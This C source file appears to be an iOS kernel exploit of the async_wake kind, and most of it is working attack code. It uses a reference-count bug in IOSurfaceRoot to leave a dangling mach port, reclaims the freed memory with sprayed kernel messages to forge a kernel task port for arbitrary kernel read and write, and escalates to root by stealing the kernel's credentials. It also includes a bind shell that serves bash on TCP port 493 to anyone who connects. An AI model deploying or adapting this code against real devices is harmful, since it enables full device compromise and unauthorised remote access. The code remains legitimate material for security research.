#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include <mach/mach.h>
#include <netinet/in.h>
#include <spawn.h>
#include <dirent.h>
#include <sys/stat.h>

#include <pthread.h>

#include <CoreFoundation/CoreFoundation.h>

#include "async_wake.h"
#include "kmem.h"
#include "find_port.h"
#include "kutils.h"
#include "symbols.h"
#include "early_kalloc.h"
#include "kcall.h"
#include "kdbg.h"

// various prototypes and structure definitions for missing iOS headers:

kern_return_t mach_vm_read(
  vm_map_t target_task,
  mach_vm_address_t address,
  mach_vm_size_t size,
  vm_offset_t *data,
  mach_msg_type_number_t *dataCnt);

/****** IOKit/IOKitLib.h *****/
typedef mach_port_t io_service_t;
typedef mach_port_t io_connect_t;

extern const mach_port_t kIOMasterPortDefault;
#define IO_OBJECT_NULL (0)

kern_return_t
IOConnectCallAsyncMethod(
  mach_port_t     connection,
  uint32_t        selector,
  mach_port_t     wakePort,
  uint64_t*       reference,
  uint32_t        referenceCnt,
  const uint64_t* input,
  uint32_t        inputCnt,
  const void*     inputStruct,
  size_t          inputStructCnt,
  uint64_t*       output,
  uint32_t*       outputCnt,
  void*           outputStruct,
  size_t*         outputStructCntP);

kern_return_t
IOConnectCallMethod(
  mach_port_t     connection,
  uint32_t        selector,
  const uint64_t* input,
  uint32_t        inputCnt,
  const void*     inputStruct,
  size_t          inputStructCnt,
  uint64_t*       output,
  uint32_t*       outputCnt,
  void*           outputStruct,
  size_t*         outputStructCntP);

io_service_t
IOServiceGetMatchingService(
  mach_port_t  _masterPort,
  CFDictionaryRef  matching);

CFMutableDictionaryRef
IOServiceMatching(
  const char* name);

kern_return_t
IOServiceOpen(
  io_service_t  service,
  task_port_t   owningTask,
  uint32_t      type,
  io_connect_t* connect );


/******** end extra headers ***************/

mach_port_t user_client = MACH_PORT_NULL;

// make_dangling will drop an extra reference on port
// this is the actual bug:
void make_dangling(mach_port_t port) {
  kern_return_t err;
  
  uint64_t inputScalar[16];
  uint32_t inputScalarCnt = 0;
  
  char inputStruct[4096];
  size_t inputStructCnt = 0x18;
  
  uint64_t* ivals = (uint64_t*)inputStruct;
  ivals[0] = 1;
  ivals[1] = 2;
  ivals[2] = 3;
  
  uint64_t outputScalar[16];
  uint32_t outputScalarCnt = 0;
  
  char outputStruct[4096];
  size_t outputStructCnt = 0;
  
  mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
  
  uint64_t reference[8] = {0};
  uint32_t referenceCnt = 1;
  
  for (int i = 0; i < 2; i++) {
    err = IOConnectCallAsyncMethod(
                                   user_client,
                                   17,  // s_set_surface_notify
                                   port,
                                   reference,
                                   referenceCnt,
                                   inputScalar,
                                   inputScalarCnt,
                                   inputStruct,
                                   inputStructCnt,
                                   outputScalar,
                                   &outputScalarCnt,
                                   outputStruct,
                                   &outputStructCnt);
    
    printf("%x\n", err);
  };
  
  err = IOConnectCallMethod(
                            user_client,
                            18,  // s_remove_surface_notify
                            inputScalar,
                            inputScalarCnt,
                            inputStruct,
                            inputStructCnt,
                            outputScalar,
                            &outputScalarCnt,
                            outputStruct,
                            &outputStructCnt);
  
  printf("%x\n", err);
}

void prepare_user_client() {
  kern_return_t err;
  io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"));
  
  if (service == IO_OBJECT_NULL){
    printf(" [-] unable to find service\n");
    exit(EXIT_FAILURE);
  }
  
  err = IOServiceOpen(service, mach_task_self(), 0, &user_client);
  if (err != KERN_SUCCESS){
    printf(" [-] unable to get user client connection\n");
    exit(EXIT_FAILURE);
  }
  
  printf("got user client: 0x%x\n", user_client);
}

mach_port_t* prepare_ports(int n_ports) {
  mach_port_t* ports = malloc(n_ports * sizeof(mach_port_t));
  for (int i = 0; i < n_ports; i++) {
    kern_return_t err;
    err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &ports[i]);
    if (err != KERN_SUCCESS) {
      printf(" [-] failed to allocate port\n");
      exit(EXIT_FAILURE);
    }
  }
  return ports;
}

void free_ports(mach_port_t* ports, int n_ports) {
  for (int i = 0; i < n_ports; i++) {
    mach_port_t port = ports[i];
    if (port == MACH_PORT_NULL) {
      continue;
    }
    
    mach_port_destroy(mach_task_self(), port);
  }
}

struct simple_msg  {
  mach_msg_header_t hdr;
  char buf[0];
};

mach_port_t send_kalloc_message(uint8_t* replacer_message_body, uint32_t replacer_body_size) {
  // allocate a port to send the messages to
  mach_port_t q = MACH_PORT_NULL;
  kern_return_t err;
  err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &q);
  if (err != KERN_SUCCESS) {
    printf(" [-] failed to allocate port\n");
    exit(EXIT_FAILURE);
  }
  
  mach_port_limits_t limits = {0};
  limits.mpl_qlimit = MACH_PORT_QLIMIT_LARGE;
  err = mach_port_set_attributes(mach_task_self(),
                                 q,
                                 MACH_PORT_LIMITS_INFO,
                                 (mach_port_info_t)&limits,
                                 MACH_PORT_LIMITS_INFO_COUNT);
  if (err != KERN_SUCCESS) {
    printf(" [-] failed to increase queue limit\n");
    exit(EXIT_FAILURE);
  }
  
  
  mach_msg_size_t msg_size = sizeof(struct simple_msg) + replacer_body_size;
  struct simple_msg* msg = malloc(msg_size);
  memset(msg, 0, sizeof(struct simple_msg));
  memcpy(&msg->buf[0], replacer_message_body, replacer_body_size);
  
  for (int i = 0; i < 256; i++) { // was MACH_PORT_QLIMIT_LARGE
    msg->hdr.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
    msg->hdr.msgh_size = msg_size;
    msg->hdr.msgh_remote_port = q;
    msg->hdr.msgh_local_port = MACH_PORT_NULL;
    msg->hdr.msgh_id = 0x41414142;
    
    err = mach_msg(&msg->hdr,
                   MACH_SEND_MSG|MACH_MSG_OPTION_NONE,
                   msg_size,
                   0,
                   MACH_PORT_NULL,
                   MACH_MSG_TIMEOUT_NONE,
                   MACH_PORT_NULL);
    
    if (err != KERN_SUCCESS) {
      printf(" [-] failed to send message %x (%d): %s\n", err, i, mach_error_string(err));
      exit(EXIT_FAILURE);
    }
  }
  
  return q;
}

/*
 for the given mach message size, how big will the ipc_kmsg structure be?
 
 This is defined in ipc_kmsg_alloc, and it's quite complicated to work it out!
 
 The size is overallocated so that if the message was sent from a 32-bit process
 they can expand out the 32-bit ool descriptors to the kernel's 64-bit ones, which
 means that for each descriptor they would need an extra 4 bytes of space for the
 larger pointer. Except at this point they have no idea what's in the message
 so they assume the worst case for all messages. This leads to approximately a 30%
 overhead in the allocation size.
 
 The allocated size also contains space for the maximum trailer plus the ipc_kmsg header.
 
 When the message is actually written into this buffer it's aligned to the end
 */
int message_size_for_kalloc_size(int kalloc_size) {
  return ((3*kalloc_size)/4) - 0x74;
}


/*
 build a fake task port object to get an arbitrary read
 
 I am basing this on the techniques used in Yalu 10.2 released by
 @qwertyoruiopz and @marcograss (and documented by Johnathan Levin
 in *OS Internals Volume III)
 
 There are a few difference here. We have a kernel memory disclosure bug so
 we know the address the dangling port pointer points to. This means we don't need
 to point the task to userspace to get a "what+where" primitive since we can just
 put whatever recursive structure we require in the object which will replace
 the free'd port.
 
 We can also leverage the fact that we have a dangling mach port pointer
 to also write to a small area of the dangling port (via mach_port_set_context)
 
 If we build the replacement object (with the fake struct task)
 correctly we can set it up such that by calling mach_port_set_context we can control
 where the arbitrary read will read from.
 
 this same method is used again a second time once the arbitrary read works so that the vm_map
 and receiver can be set correctly turning this into a fake kernel task port.
 */

uint32_t IO_BITS_ACTIVE = 0x80000000;
uint32_t IKOT_TASK = 2;
uint32_t IKOT_NONE = 0;

uint64_t second_port_initial_context = 0x1024204110244201;

uint8_t* build_message_payload(uint64_t dangling_port_address, uint32_t message_body_size, uint32_t message_body_offset, uint64_t vm_map, uint64_t receiver, uint64_t** context_ptr) {
  uint8_t* body = malloc(message_body_size);
  memset(body, 0, message_body_size);
  
  uint32_t port_page_offset = dangling_port_address & 0xfff;
  
  // structure required for the first fake port:
  uint8_t* fake_port = body + (port_page_offset - message_body_offset);

  
  *(uint32_t*)(fake_port+koffset(KSTRUCT_OFFSET_IPC_PORT_IO_BITS)) = IO_BITS_ACTIVE | IKOT_TASK;
  *(uint32_t*)(fake_port+koffset(KSTRUCT_OFFSET_IPC_PORT_IO_REFERENCES)) = 0xf00d; // leak references
  *(uint32_t*)(fake_port+koffset(KSTRUCT_OFFSET_IPC_PORT_IP_SRIGHTS)) = 0xf00d; // leak srights
  *(uint64_t*)(fake_port+koffset(KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER)) = receiver;
  *(uint64_t*)(fake_port+koffset(KSTRUCT_OFFSET_IPC_PORT_IP_CONTEXT)) = 0x123456789abcdef;
  
  *context_ptr = (uint64_t*)(fake_port+koffset(KSTRUCT_OFFSET_IPC_PORT_IP_CONTEXT));
  
  
  // set the kobject pointer such that task->bsd_info reads from ip_context:
  int fake_task_offset = koffset(KSTRUCT_OFFSET_IPC_PORT_IP_CONTEXT) - koffset(KSTRUCT_OFFSET_TASK_BSD_INFO);
  
  uint64_t fake_task_address = dangling_port_address + fake_task_offset;
  *(uint64_t*)(fake_port+koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT)) = fake_task_address;
  
  
  // when we looked for a port to make dangling we made sure it was correctly positioned on the page such that when we set the fake task
  // pointer up there it's actually all in the buffer so we can also set the reference count to leak it, let's double check that!

  if (fake_port + fake_task_offset < body) {
    printf("the maths is wrong somewhere, fake task doesn't fit in message\n");
    sleep(10);
    exit(EXIT_FAILURE);
  }

  uint8_t* fake_task = fake_port + fake_task_offset;
    
  // set the ref_count field of the fake task:
  *(uint32_t*)(fake_task + koffset(KSTRUCT_OFFSET_TASK_REF_COUNT)) = 0xd00d; // leak references
    
  // make sure the task is active
  *(uint32_t*)(fake_task + koffset(KSTRUCT_OFFSET_TASK_ACTIVE)) = 1;
    
  // set the vm_map of the fake task:
  *(uint64_t*)(fake_task + koffset(KSTRUCT_OFFSET_TASK_VM_MAP)) = vm_map;
    
  // set the task lock type of the fake task's lock:
  *(uint8_t*)(fake_task + koffset(KSTRUCT_OFFSET_TASK_LCK_MTX_TYPE)) = 0x22;
  return body;
}


/*
 * the first tpf0 we get still hangs of the dangling port and is backed by a type-confused ipc_kmsg buffer
 *
 * use that tfp0 to build a safer one such that we can safely free everything this process created and exit
 * without leaking memory
 */
mach_port_t build_safe_fake_tfp0(uint64_t vm_map, uint64_t space) {
  kern_return_t err;

  mach_port_t tfp0 = MACH_PORT_NULL;
  err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &tfp0);
  if (err != KERN_SUCCESS) {
    printf("unable to allocate port\n");
  }
  
  // build a fake struct task for the kernel task:
  //uint64_t fake_kernel_task_kaddr = kmem_alloc_wired(0x4000);
  uint64_t fake_kernel_task_kaddr = early_kalloc(0x1000);
  printf("fake_kernel_task_kaddr: %llx\n", fake_kernel_task_kaddr);

  
  void* fake_kernel_task = malloc(0x1000);
  memset(fake_kernel_task, 0, 0x1000);
  *(uint32_t*)(fake_kernel_task + koffset(KSTRUCT_OFFSET_TASK_REF_COUNT)) = 0xd00d; // leak references
  *(uint32_t*)(fake_kernel_task + koffset(KSTRUCT_OFFSET_TASK_ACTIVE)) = 1;
  *(uint64_t*)(fake_kernel_task + koffset(KSTRUCT_OFFSET_TASK_VM_MAP)) = vm_map;
  *(uint8_t*)(fake_kernel_task + koffset(KSTRUCT_OFFSET_TASK_LCK_MTX_TYPE)) = 0x22;
  kmemcpy(fake_kernel_task_kaddr, (uint64_t) fake_kernel_task, 0x1000);
  free(fake_kernel_task);
  
  uint32_t fake_task_refs = rk32(fake_kernel_task_kaddr + koffset(KSTRUCT_OFFSET_TASK_REF_COUNT));
  printf("read fake_task_refs: %x\n", fake_task_refs);
  if (fake_task_refs != 0xd00d) {
    printf("read back value didn't match...\n");
  }
  
  // now make the changes to the port object to make it a task port:
  uint64_t port_kaddr = find_port_address(tfp0, MACH_MSG_TYPE_MAKE_SEND);
  
  wk32(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IO_BITS), IO_BITS_ACTIVE | IKOT_TASK);
  wk32(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IO_REFERENCES), 0xf00d);
  wk32(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_SRIGHTS), 0xf00d);
  wk64(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER), space);
  wk64(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT),  fake_kernel_task_kaddr);
  
  // swap our receive right for a send right:
  uint64_t task_port_addr = task_self_addr();
  uint64_t task_addr = rk64(task_port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
  uint64_t itk_space = rk64(task_addr + koffset(KSTRUCT_OFFSET_TASK_ITK_SPACE));
  uint64_t is_table = rk64(itk_space + koffset(KSTRUCT_OFFSET_IPC_SPACE_IS_TABLE));
  
  uint32_t port_index = tfp0 >> 8;
  const int sizeof_ipc_entry_t = 0x18;
  uint32_t bits = rk32(is_table + (port_index * sizeof_ipc_entry_t) + 8); // 8 = offset of ie_bits in struct ipc_entry

#define IE_BITS_SEND (1<<16)
#define IE_BITS_RECEIVE (1<<17)
  
  bits &= (~IE_BITS_RECEIVE);
  bits |= IE_BITS_SEND;
  
  wk32(is_table + (port_index * sizeof_ipc_entry_t) + 8, bits);
  
  printf("about to test new tfp0\n");
  
  vm_offset_t data_out = 0;
  mach_msg_type_number_t out_size = 0;
  err = mach_vm_read(tfp0, vm_map, 0x40, &data_out, &out_size);
  if (err != KERN_SUCCESS) {
    printf("mach_vm_read failed: %x %s\n", err, mach_error_string(err));
    sleep(3);
    exit(EXIT_FAILURE);
  }

  printf("kernel read via second tfp0 port worked?\n");
  printf("0x%016llx\n", *(uint64_t*)data_out);
  printf("0x%016llx\n", *(uint64_t*)(data_out+8));
  printf("0x%016llx\n", *(uint64_t*)(data_out+0x10));
  printf("0x%016llx\n", *(uint64_t*)(data_out+0x18));
  
  return tfp0;
}



// task_self_addr points to the struct ipc_port for our task port
uint64_t find_kernel_vm_map(uint64_t task_self_addr) {
  uint64_t struct_task = rk64(task_self_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
  
  while (struct_task != 0) {
    uint64_t bsd_info = rk64(struct_task + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO));
    
    uint32_t pid = rk32(bsd_info + koffset(KSTRUCT_OFFSET_PROC_PID));
    
    if (pid == 0) {
      uint64_t vm_map = rk64(struct_task + koffset(KSTRUCT_OFFSET_TASK_VM_MAP));
      return vm_map;
    }
    
    struct_task = rk64(struct_task + koffset(KSTRUCT_OFFSET_TASK_PREV));
  }
  
  printf("unable to find kernel task...\n");
  sleep(10);
  exit(EXIT_FAILURE);
}

const uint64_t context_magic   = 0x1214161800000000; // a random constant
const uint64_t initial_context = 0x1020304015253545; // another random constant

mach_port_t get_kernel_memory_rw() {
  // offsets are required before we get r/w:
  offsets_init();
  
  kern_return_t err;
  
  uint32_t MAX_KERNEL_TRAILER_SIZE = 0x44;
  uint32_t replacer_body_size = message_size_for_kalloc_size(4096) - sizeof(mach_msg_header_t);
  uint32_t message_body_offset = 0x1000 - replacer_body_size - MAX_KERNEL_TRAILER_SIZE;
  
  printf("message size for kalloc.4096: %d\n", message_size_for_kalloc_size(4096));
  
  prepare_user_client();
  
  uint64_t task_self = task_self_addr();
  if (task_self == 0) {
    printf("unable to disclose address of our task port\n");
    sleep(10);
    exit(EXIT_FAILURE);
  }
  printf("our task port is at 0x%llx\n", task_self);
  
  int n_pre_ports = 100000; //8000
  mach_port_t* pre_ports = prepare_ports(n_pre_ports);
  
  // make a bunch of smaller allocations in a different zone which can be collected later:
  uint32_t smaller_body_size = message_size_for_kalloc_size(1024) - sizeof(mach_msg_header_t);
  
  uint8_t* smaller_body = malloc(smaller_body_size);
  memset(smaller_body, 'C', smaller_body_size);
  
  const int n_smaller_ports = 600; // 150 MB
  mach_port_t smaller_ports[n_smaller_ports];
  for (int i = 0; i < n_smaller_ports; i++) {
    smaller_ports[i] = send_kalloc_message(smaller_body, smaller_body_size);
  }
  
  // now find a suitable port
  // we'll replace the port with an ipc_kmsg buffer containing controlled data, but we don't
  // completely control all the data:
  // specifically we're targetting kalloc.4096 but the message body will only span
  // xxx448 -> xxxfbc so we want to make sure the port we target is within that range
  // actually, since we're also putting a fake task struct here and want
  // the task's bsd_info pointer to overlap with the ip_context field we need a stricter range
  
  
  int ports_to_test = 100;
  int base = n_pre_ports - 1000;

  mach_port_t first_port = MACH_PORT_NULL;
  uint64_t first_port_address = 0;
  
  for (int i = 0; i < ports_to_test; i++) {
    mach_port_t candidate_port = pre_ports[base+i];
    uint64_t candidate_address = find_port_address(candidate_port, MACH_MSG_TYPE_MAKE_SEND);
    uint64_t page_offset = candidate_address & 0xfff;
    if (page_offset > 0xa00 && page_offset < 0xe80) { // this range could be wider but there's no need
      printf("found target port with suitable allocation page offset: 0x%016llx\n", candidate_address);
      pre_ports[base+i] = MACH_PORT_NULL;
      first_port = candidate_port;
      first_port_address = candidate_address;
      break;
    }
  }
  
  if (first_port == MACH_PORT_NULL) {
    printf("unable to find a candidate port with a suitable page offset\n");
    exit(EXIT_FAILURE);
  }

  
  uint64_t* context_ptr = NULL;
  uint8_t* replacer_message_body = build_message_payload(first_port_address, replacer_body_size, message_body_offset, 0, 0, &context_ptr);
  printf("replacer_body_size: 0x%x\n", replacer_body_size);
  printf("message_body_offset: 0x%x\n", message_body_offset);
  
  make_dangling(first_port);
  
  free_ports(pre_ports, n_pre_ports);
  
  // free the smaller ports, they will get gc'd later:
  for (int i = 0; i < n_smaller_ports; i++) {
    mach_port_destroy(mach_task_self(), smaller_ports[i]);
  }

  
  // now try to get that zone collected and reallocated as something controllable (kalloc.4096):

  const int replacer_ports_limit = 200; // about 200 MB
  mach_port_t replacer_ports[replacer_ports_limit];
  memset(replacer_ports, 0, sizeof(replacer_ports));
  uint32_t i;
  for (i = 0; i < replacer_ports_limit; i++) {
    uint64_t context_val = (context_magic)|i;
    *context_ptr = context_val;
    replacer_ports[i] = send_kalloc_message(replacer_message_body, replacer_body_size);
    
    // we want the GC to actually finish, so go slow...
    pthread_yield_np();
    usleep(10000);
    printf("%d\n", i);
  }
  

  // find out which replacer port it was
  mach_port_context_t replacer_port_number = 0;
  err = mach_port_get_context(mach_task_self(), first_port, &replacer_port_number);
  if (err != KERN_SUCCESS) {
    printf("unable to get context: %d %s\n", err, mach_error_string(err));
    sleep(3);
    exit(EXIT_FAILURE);
  }
  replacer_port_number &= 0xffffffff;
  if (replacer_port_number >= (uint64_t)replacer_ports_limit) {
    printf("suspicious context value, something's wrong %lx\n", replacer_port_number);
    sleep(3);
    exit(EXIT_FAILURE);
  }
  
  printf("got replaced with replacer port %ld\n", replacer_port_number);

  prepare_rk_via_kmem_read_port(first_port);
  
  uint64_t kernel_vm_map = find_kernel_vm_map(task_self);
  printf("found kernel vm_map: 0x%llx\n", kernel_vm_map);
  
  
  // now free first replacer and put a fake kernel task port there
  // we need to do this becase the first time around we don't know the address
  // of ipc_space_kernel which means we can't fake a port owned by the kernel
  free(replacer_message_body);
  replacer_message_body = build_message_payload(first_port_address, replacer_body_size, message_body_offset, kernel_vm_map, ipc_space_kernel(), &context_ptr);
  
  // free the first replacer
  mach_port_t replacer_port = replacer_ports[replacer_port_number];
  replacer_ports[replacer_port_number] = MACH_PORT_NULL;
  mach_port_destroy(mach_task_self(), replacer_port);
  
  const int n_second_replacer_ports = 10;
  mach_port_t second_replacer_ports[n_second_replacer_ports];
  
  for (int i = 0; i < n_second_replacer_ports; i++) {
    *context_ptr = i;
    second_replacer_ports[i] = send_kalloc_message(replacer_message_body, replacer_body_size);
  }
  
  // hopefully that worked the second time too!
  // check the context:
  
  replacer_port_number = 0;
  err = mach_port_get_context(mach_task_self(), first_port, &replacer_port_number);
  if (err != KERN_SUCCESS) {
    printf("unable to get context: %d %s\n", err, mach_error_string(err));
    sleep(3);
    exit(EXIT_FAILURE);
  }
  
  replacer_port_number &= 0xffffffff;
  if (replacer_port_number >= (uint64_t)n_second_replacer_ports) {
    printf("suspicious context value, something's wrong %lx\n", replacer_port_number);
    sleep(3);
    exit(EXIT_FAILURE);
  }
  
  printf("second time got replaced with replacer port %ld\n", replacer_port_number);
  
  // clear up the original replacer ports:
  for (int i = 0; i < replacer_ports_limit; i++) {
    mach_port_destroy(mach_task_self(), replacer_ports[i]);
  }
  
  // then clear up the second replacer ports (apart from the one in use)
  mach_port_t second_replacement_port = second_replacer_ports[replacer_port_number];
  second_replacer_ports[replacer_port_number] = MACH_PORT_NULL;
  for (int i = 0; i < n_second_replacer_ports; i++) {
    mach_port_destroy(mach_task_self(), second_replacer_ports[i]);
  }
  
  printf("will try to read from second port (fake kernel)\n");
  // try to read some kernel memory using the second port:
  vm_offset_t data_out = 0;
  mach_msg_type_number_t out_size = 0;
  err = mach_vm_read(first_port, kernel_vm_map, 0x40, &data_out, &out_size);
  if (err != KERN_SUCCESS) {
    printf("mach_vm_read failed: %x %s\n", err, mach_error_string(err));
    sleep(3);
    exit(EXIT_FAILURE);
  }
  
  printf("kernel read via fake kernel task port worked?\n");
  printf("0x%016llx\n", *(uint64_t*)data_out);
  printf("0x%016llx\n", *(uint64_t*)(data_out+8));
  printf("0x%016llx\n", *(uint64_t*)(data_out+0x10));
  printf("0x%016llx\n", *(uint64_t*)(data_out+0x18));
  
  prepare_rwk_via_tfp0(first_port);
  printf("about to build safer tfp0\n");
  
  //early_kalloc(0x10000);
  //return 0;
  
  mach_port_t safer_tfp0 = build_safe_fake_tfp0(kernel_vm_map, ipc_space_kernel());
  prepare_rwk_via_tfp0(safer_tfp0);
  
  printf("built safer tfp0\n");
  printf("about to clear up\n");
  
  // can now clean everything up
  wk32(first_port_address + koffset(KSTRUCT_OFFSET_IPC_PORT_IO_BITS), IO_BITS_ACTIVE | IKOT_NONE);
  wk64(first_port_address + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT),  0);
  
  // first port will soon point to freed memory, so neuter it:
  uint64_t task_port_addr = task_self_addr();
  uint64_t task_addr = rk64(task_port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
  uint64_t itk_space = rk64(task_addr + koffset(KSTRUCT_OFFSET_TASK_ITK_SPACE));
  uint64_t is_table = rk64(itk_space + koffset(KSTRUCT_OFFSET_IPC_SPACE_IS_TABLE));
  
  uint32_t port_index = first_port >> 8;
  const int sizeof_ipc_entry_t = 0x18;
  
  // remove all rights
  wk32(is_table + (port_index * sizeof_ipc_entry_t) + 8, 0);
  
  // clear the ipc_port port too
  wk64(is_table + (port_index * sizeof_ipc_entry_t), 0);
  
  mach_port_destroy(mach_task_self(), second_replacement_port);
  printf("cleared up\n");
  return safer_tfp0;
}

char* bundle_path() {
    CFBundleRef mainBundle = CFBundleGetMainBundle();
    CFURLRef resourcesURL = CFBundleCopyResourcesDirectoryURL(mainBundle);
    int len = 4096;
    char* path = malloc(len);
    
    CFURLGetFileSystemRepresentation(resourcesURL, TRUE, (UInt8*)path, len);
    
    return path;
}

char* prepare_directory(char* dir_path) {
    DIR *dp;
    struct dirent *ep;
    
    char* in_path = NULL;
    char* bundle_root = bundle_path();
    asprintf(&in_path, "%s/iosbinpack64/%s", bundle_root, dir_path);
    
    
    dp = opendir(in_path);
    if (dp == NULL) {
        printf("unable to open payload directory: %s\n", in_path);
        return NULL;
    }
    
    while ((ep = readdir(dp))) {
        char* entry = ep->d_name;
        char* full_entry_path = NULL;
        asprintf(&full_entry_path, "%s/iosbinpack64/%s/%s", bundle_root, dir_path, entry);
        
        printf("preparing: %s\n", full_entry_path);
        
        // make that executable:
        int chmod_err = chmod(full_entry_path, 0777);
        if (chmod_err != 0){
            perror("chmod failed");
        }
        
        free(full_entry_path);
    }
    
    closedir(dp);
    free(bundle_root);
    
    return in_path;
}

// prepare all the payload binaries under the iosbinpack64 directory
// and build up the PATH
char* prepare_payload() {
    char* path = calloc(4096, 1);
    strcpy(path, "PATH=");
    char* dir;
    dir = prepare_directory("bin");
    strcat(path, dir);
    strcat(path, ":");
    free(dir);
    
    dir = prepare_directory("sbin");
    strcat(path, dir);
    strcat(path, ":");
    free(dir);
    
    dir = prepare_directory("usr/bin");
    strcat(path, dir);
    strcat(path, ":");
    free(dir);
    
    dir = prepare_directory("usr/local/bin");
    strcat(path, dir);
    strcat(path, ":");
    free(dir);
    
    dir = prepare_directory("usr/sbin");
    strcat(path, dir);
    strcat(path, ":");
    free(dir);
    
    strcat(path, "/bin:/sbin:/usr/bin:/usr/sbin:/usr/libexec");
    
    return path;
}

void bind_shell() {
    
    char* env = prepare_payload();
    char* bundle_root = bundle_path();
    
    char* shell_path = NULL;
    asprintf(&shell_path, "%s/iosbinpack64/bin/bash", bundle_root);
    
    char* argv[] = {shell_path, NULL};
    char* envp[] = {env, NULL};
    
    struct sockaddr_in sa;
    sa.sin_len = 0;
    sa.sin_family = AF_INET;
    sa.sin_port = htons(493);
    sa.sin_addr.s_addr = INADDR_ANY;
    
    int sock = socket(PF_INET, SOCK_STREAM, 0);
    bind(sock, (struct sockaddr*)&sa, sizeof(sa));
    listen(sock, 1);
    
    printf("shell listening on port %d\n", 493);
    
    for(;;) {
        int conn = accept(sock, 0, 0);
        
        posix_spawn_file_actions_t actions;
        
        posix_spawn_file_actions_init(&actions);
        posix_spawn_file_actions_adddup2(&actions, conn, 0);
        posix_spawn_file_actions_adddup2(&actions, conn, 1);
        posix_spawn_file_actions_adddup2(&actions, conn, 2);
        
        
        pid_t spawned_pid = 0;
        int spawn_err = posix_spawn(&spawned_pid, shell_path, &actions, NULL, argv, envp);
        
        if (spawn_err != 0){
            perror("shell spawn error");
        } else {
            printf("shell posix_spawn success!\n");
        }
        
        posix_spawn_file_actions_destroy(&actions);
        
        printf("our pid: %d\n", getpid());
        printf("spawned_pid: %d\n", spawned_pid);
        
        int wl = 0;
        while (waitpid(spawned_pid, &wl, 0) == -1 && errno == EINTR);
    }
    
    free(shell_path);
}

// gets uid 0 (iOS 11)
// add patchfinder and you should be good
// Abraham Masri @cheesecakeufo
// https://gist.github.com/iabem97/d11e61afa7a0d0a9f2b5a1e42ee505d8


/*
 * Purpose: iterates over the procs and finds our proc
 */
uint64_t get_our_proc() {
    
    uint64_t task_self = task_self_addr();
    uint64_t struct_task = rk64(task_self + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
    
    
    while (struct_task != 0) {
        uint64_t bsd_info = rk64(struct_task + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO));
        
        // get the process pid
        uint32_t pid = rk32(bsd_info + koffset(KSTRUCT_OFFSET_PROC_PID));
        
        if(pid == getpid()) {
            return bsd_info;
        }
        
        struct_task = rk64(struct_task + koffset(KSTRUCT_OFFSET_TASK_PREV));
    }
    return -1; // we failed :/
}

kern_return_t get_root (uint64_t kernel_task) {
    
    kern_return_t ret = KERN_SUCCESS;
    
    uint64_t our_proc = get_our_proc();
    
    if(our_proc == -1) {
        printf("[ERROR]: no our proc. wut\n");
        ret = KERN_FAILURE;
        return ret;
    }
    
    printf("[INFO]: kernel_task: %llx\n", kernel_task); // BSD_INFO
    
    uint64_t kern_ucred = rk64(kernel_task + 0x100 /* KSTRUCT_OFFSET_PROC_UCRED */);
    printf("[INFO]: kern_ucred: %llx\n", kern_ucred);
    
    uint64_t offsetof_p_csflags = 0x2a8;
    
    uint32_t csflags = rk32(our_proc + offsetof_p_csflags);
    
    uint64_t our_cred = rk64(our_proc + 0x100 /* KSTRUCT_OFFSET_PROC_UCRED */);
    
    wk64(our_proc + 0x100 /* KSTRUCT_OFFSET_PROC_UCRED */, kern_ucred);
    
    
    printf("[INFO]: successfully wrote our kern_ucred into our cred!\n");
    
    setuid(0);
    printf("[INFO]: getuid: %d\n", getuid());
    int fd = open("/var/mobile/xxx", O_WRONLY);
    
    // you'll probably panic few seconds after this thanks to the new sandbox protections
    
    return ret;
}

mach_port_t go() {
  mach_port_t tfp0 = get_kernel_memory_rw();
  printf("tfp0: %x\n", tfp0);
    
    
    /*uint64_t kernelbase = find_kernel_base();
    
    extern kern_return_t mach_vm_read_overwrite(vm_map_t target_task, mach_vm_address_t address, mach_vm_size_t size, mach_vm_address_t data, mach_vm_size_t *outsize);
    uint64_t magic = 0;
    mach_vm_size_t sz = sizeof(magic);
    kern_return_t ret = mach_vm_read_overwrite(tfp0, kernelbase, sizeof(magic), (mach_vm_address_t)&magic, &sz);
    printf("mach_vm_read_overwrite: %x, %s\n", magic, mach_error_string(ret));
    
    FILE *f = fopen("/var/mobile/test.txt", "w");
    if(f == 0){
        printf("failed to write file\n");
    }*/
    
    //char* env_path = prepare_payload();
    //printf("will launch a shell with this environment: %s\n", env_path);
    
    //bind_shell(env_path, 493);
    //free(env_path);
    
  if (probably_have_correct_symbols()) {
    printf("have symbols for this device, testing the kernel debugger...\n");
    test_kdbg();
  }
  return tfp0;
}
